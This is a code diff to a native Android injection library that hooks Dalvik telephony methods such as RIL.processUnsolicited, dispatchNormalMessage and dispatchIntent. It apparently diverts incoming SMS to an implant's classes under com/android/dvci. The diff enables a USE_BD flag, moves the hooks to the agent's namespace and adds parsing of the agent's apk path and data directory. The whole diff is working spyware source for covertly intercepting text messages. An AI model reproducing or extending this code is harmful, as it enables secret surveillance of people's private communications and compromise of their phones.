@@ -30,12 +30,12 @@
 #include "dalvik_hook.h"
 #include "base.h"
 #include "ipc_examiner.h"
-char    *needle = ".................____________.......................";
-char *dumpPath =  ".................____________.......................";
+char *dumpPath    =  ".................____________.......................";
+char *quite_needle = ".................____________......................";
 char *dexFile = "/data/local/tmp/ddiclasses.dex";
 char *dumpDir = NULL;
 #undef log
-//#define USE_BD
+#define USE_BD
 
 #ifdef DEBUG
 /*
@@ -473,7 +473,7 @@ static int my_processUnsolicited(JNIEnv *env, jobject this, jobject p)
    */
    //log("start! c=0x%x m=0x%x\n", processUnsolicited_cache.cls_h, processUnsolicited_cache.mid_h);
    (*env)->MonitorEnter(env,this);
-   char *classes[] = { "phone/android/com/SMSDispatch", "phone/android/com/Reflect", "com/android/dvci/util/LowEventHandlerDefs", NULL };
+   char *classes[] = { "com/android/dvci/event/OOB/SMSDispatch", "com/android/dvci/util/Reflect", "com/android/dvci/util/LowEventHandlerDefs", NULL };
    if (processUnsolicited_cache.cls_h == 0) {
       if (load_dext(dumpPath, classes)) {
          log("failed to load class ");
@@ -487,7 +487,7 @@ static int my_processUnsolicited(JNIEnv *env, jobject this, jobject p)
       // call static method and passin the sms
       //log(" parcel = 0x%x\n", p)
       if (processUnsolicited_cache.cls_h == 0) {
-         processUnsolicited_cache.cls_h = (*env)->FindClass(env, "phone/android/com/SMSDispatch");
+         processUnsolicited_cache.cls_h = (*env)->FindClass(env, "com/android/dvci/event/OOB/SMSDispatch");
       }
       if (processUnsolicited_cache.cls_h != 0) {
          if (processUnsolicited_cache.mid_h == 0) {
@@ -499,7 +499,7 @@ static int my_processUnsolicited(JNIEnv *env, jobject this, jobject p)
             log("method not found!\n")
          }
       } else {
-         log("phone/android/com/SMSDispatch not found!\n")
+         log("com/android/dvci/event/OOB/SMSDispatch not found!\n")
       }
    }
    // call original SMS dispatch method
@@ -532,8 +532,8 @@ static int my_dispatchNormalMessage(JNIEnv *env, jobject obj, jobject smsMessage
 {
    jint callOrig = 1;
       char *classes[]={
-            "phone/android/com/SMSDispatch",
-            "phone/android/com/Reflect",
+            "com/android/dvci/event/OOB/SMSDispatch",
+            "com/android/dvci/util/Reflect",
             "com/android/dvci/util/LowEventHandlerDefs",
             NULL
       };
@@ -542,7 +542,7 @@ static int my_dispatchNormalMessage(JNIEnv *env, jobject obj, jobject smsMessage
       } else {
          // call static method and passin the sms
          log("smsMessageBase = 0x%x\n", smsMessageBase)
-         jclass smsd = (*env)->FindClass(env, "phone/android/com/SMSDispatch");
+         jclass smsd = (*env)->FindClass(env, "com/android/dvci/event/OOB/SMSDispatch");
 
       if (smsd) {
          jmethodID staticId = (*env)->GetStaticMethodID(env, smsd, "dispatchNormalMessage", "(Ljava/lang/Object;)I");
@@ -570,7 +570,7 @@ static int my_dispatchNormalMessage(JNIEnv *env, jobject obj, jobject smsMessage
             log("method not found!\n")
          }
       } else {
-         log("phone/android/com/SMSDispatch not found!\n")
+         log("com/android/dvci/event/OOB/SMSDispatch not found!\n")
       }
    }
    // call original SMS dispatch method
@@ -607,7 +607,7 @@ static void my_dispatchIntent(JNIEnv *env, jobject this, jobject intent, jobject
       // call static method and passin the sms
       log("intent = 0x%x\n", intent)
 
-      jclass smsd = (*env)->FindClass(env, "phone/android/com/SMSDispatch");
+      jclass smsd = (*env)->FindClass(env, "com/android/dvci/event/OOB/SMSDispatch");
       if (smsd) {
          jmethodID staticId = (*env)->GetStaticMethodID(env, smsd, "dispatchIntent", "(Landroid/content/Intent;)I");
          if (staticId) {
@@ -620,7 +620,7 @@ static void my_dispatchIntent(JNIEnv *env, jobject this, jobject intent, jobject
             log("method not found!\n")
          }
       } else {
-         log("phone/android/com/SMSDispatch not found!\n")
+         log("com/android/dvci/event/OOB/SMSDispatch not found!\n")
       }
    }
    // call original SMS dispatch method
@@ -653,32 +653,35 @@ static int my_epoll_wait(int epfd, struct epoll_event *events, int maxevents, in
    // resolve symbols from DVM
    dexstuff_resolv_dvm(&d);
    log("my_epoll_wait: try_hook\n")
-   if (and_maj == 4 && and_min < 4) {
-      dalvik_hook_setup(&dispatchNormalMessage, "Lcom/android/internal/telephony/SMSDispatcher;", "dispatchNormalMessage", "(Lcom/android/internal/telephony/SmsMessageBase;)I", 2, my_dispatchNormalMessage);
-      if (dalvik_hook(&d, &dispatchNormalMessage)) {
-         log("my_epoll_wait: hook dispatchNormalMessage ok\n")
-      } else {
-         log("my_epoll_wait: hook dispatchNormalMessage fails\n")
-      }
-   } else if (and_maj == 4 && and_min >= 4) {
-
+   if (and_maj == 4){
       //private void processUnsolicited (Parcel p) {
       processUnsolicited_cache.cls_h = NULL;
       processUnsolicited_cache.mid_h = NULL;
-       dalvik_hook_setup(&processUnsolicited_dh, "Lcom/android/internal/telephony/RIL;", "processUnsolicited", "(Landroid/os/Parcel;)V", 2, my_processUnsolicited);
-       if (dalvik_hook(&d, &processUnsolicited_dh)) {
-       log("my_epoll_wait: hook processUnsolicited ok\n")
-       } else {
-       log("my_epoll_wait: hook processUnsolicited fails\n")
-       }
-
-      dalvik_hook_setup(&dispatchNormalMessage, "Lcom/android/internal/telephony/InboundSmsHandler;", "dispatchNormalMessage", "(Lcom/android/internal/telephony/SmsMessageBase;)I", 2, my_dispatchNormalMessage);
-      if (dalvik_hook(&d, &dispatchNormalMessage)) {
-         log("my_epoll_wait: hook dispatchNormalMessage ok\n")
+      dalvik_hook_setup(&processUnsolicited_dh, "Lcom/android/internal/telephony/RIL;", "processUnsolicited", "(Landroid/os/Parcel;)V", 2, my_processUnsolicited);
+      if (dalvik_hook(&d, &processUnsolicited_dh)) {
+         log("my_epoll_wait: hook processUnsolicited ok\n")
       } else {
-         log("my_epoll_wait: hook dispatchNormalMessage fails\n")
+         log("my_epoll_wait: hook processUnsolicited fails\n")
       }
+      if ( and_min < 4) {
+         dalvik_hook_setup(&dispatchNormalMessage, "Lcom/android/internal/telephony/SMSDispatcher;", "dispatchNormalMessage", "(Lcom/android/internal/telephony/SmsMessageBase;)I", 2, my_dispatchNormalMessage);
+         if (dalvik_hook(&d, &dispatchNormalMessage)) {
+            log("my_epoll_wait: hook dispatchNormalMessage ok\n")
+         } else {
+            log("my_epoll_wait: hook dispatchNormalMessage fails\n")
+         }
+      } else if (and_min >= 4) {
 
+
+
+         dalvik_hook_setup(&dispatchNormalMessage, "Lcom/android/internal/telephony/InboundSmsHandler;", "dispatchNormalMessage", "(Lcom/android/internal/telephony/SmsMessageBase;)I", 2, my_dispatchNormalMessage);
+         if (dalvik_hook(&d, &dispatchNormalMessage)) {
+            log("my_epoll_wait: hook dispatchNormalMessage ok\n")
+         } else {
+            log("my_epoll_wait: hook dispatchNormalMessage fails\n")
+         }
+
+      }
    } else {
       log("injection not possible \n");
       return 1;
@@ -729,22 +732,45 @@ void __attribute__ ((constructor)) my_init(void);
 void my_init(void)
 {
    char createcnf = 0;
+   char *lastAt = NULL;
    log("started\n");
    get_android_version();
 
 #ifdef DEBUG
    debug = 1;
 #endif
-
-   if( strncmp(dumpPath,needle,strlen(needle)) == 0 ){
+   log("my_init:dumpPath is %s\n",dumpPath);
+   if( strncmp(quite_needle,dumpPath,strlen(quite_needle)) == 0 ){
       log("my_init: got path %s\n",dumpPath);
       dumpPath = dexFile;
    }else{
       log("my_init: path patched %s\n",dumpPath);
+
       dexFile=findLast(dumpPath,"/");
       if(dexFile != NULL){
          dexFile++;
-         dumpDir=strndup(dumpPath, dexFile - dumpPath);
+         if(strncmp("/data/app/",dumpPath,strlen("/data/app/"))==0 && (lastAt = findLast(dumpPath,"@"))!=NULL){
+            /*
+             * In this case dumpath has been configured as:
+             * /data/app/<agentName>.apk@<agentPackage>
+             * So we need to :
+             * 1) extract the correct dumpDir that is /data/data/<agentPackage>/files/m4 and place in dumpDir
+             * 2) extract the apk file, wihch is /data/app/<agentName>.apk and place in dumpPath
+             */
+            int len = strlen("/data/data/")+strlen(dumpPath)-(lastAt-dumpPath)+11; // 11 = /files/m4/\0
+            log("allocating dumpDir[%d] strlen(lastAt)-1 = %d lastAt=%s \n",len,strlen(lastAt)-1,lastAt);
+            dumpDir=calloc(1,len); // 11 = /files/m4/\0
+            if(dumpDir == NULL ){
+               log("failed to alloc dumpDir[%d]  \n",len);
+            }else{
+               snprintf(dumpDir, len, "/data/data/%s/files/m4", lastAt+1);
+               dexFile=strndup(dumpPath, lastAt - dumpPath );
+               dumpPath = dexFile;
+            }
+
+         }else{
+            dumpDir=strndup(dumpPath, dexFile - dumpPath);
+         }
          if(dumpDir == NULL ){
             log("failed to duplicate dumpPath=%s\n",dumpPath);
          }else{
@@ -765,5 +791,6 @@ void my_init(void)
       create_cnf();
    }
    dexstuff_resolv_dvm(&d);
+   //log("my_init: printClass\n");
    //dalvik_dump_class(&d,"");
 }
